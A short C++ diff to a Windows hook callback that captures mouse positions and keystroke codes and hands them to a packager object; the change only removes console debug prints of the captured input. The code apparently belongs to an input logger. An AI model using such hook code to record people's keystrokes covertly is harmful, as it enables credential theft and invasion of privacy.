@@ -52,17 +52,14 @@ void Hooker::receiveCallback(int nCode, WPARAM wParam, LPARAM lParam, bool isMou
 				std::abs(std::abs(mouseStruct->pt.y) - std::abs(_previousPoint.y)) >= 100)) {
 				_previousPoint.x = mouseStruct->pt.x;
 				_previousPoint.y = mouseStruct->pt.y;
-				std::cout << "MOUSE INPUT " << nCode << "  " << wParam << "  " << mouseStruct->pt.x << "  " << mouseStruct->pt.y << std::endl;
 				_packager->addClick(nCode, wParam, lParam);
 			}
 		}
 		else {
-			std::cout << "MOUSE INPUT " << nCode << "  " << wParam << "  " << mouseStruct->pt.x << "  " << mouseStruct->pt.y << std::endl;
 			_packager->addClick(nCode, wParam, lParam);	// MOUSEINPUT
 		}
 	}
 	else {
-		std::cout << "KB INPUT " << nCode << "  " << wParam << "  " << ((KBDLLHOOKSTRUCT *)lParam)->vkCode << std::endl;
 		_packager->addKey(nCode, wParam, lParam);
 	}
 }
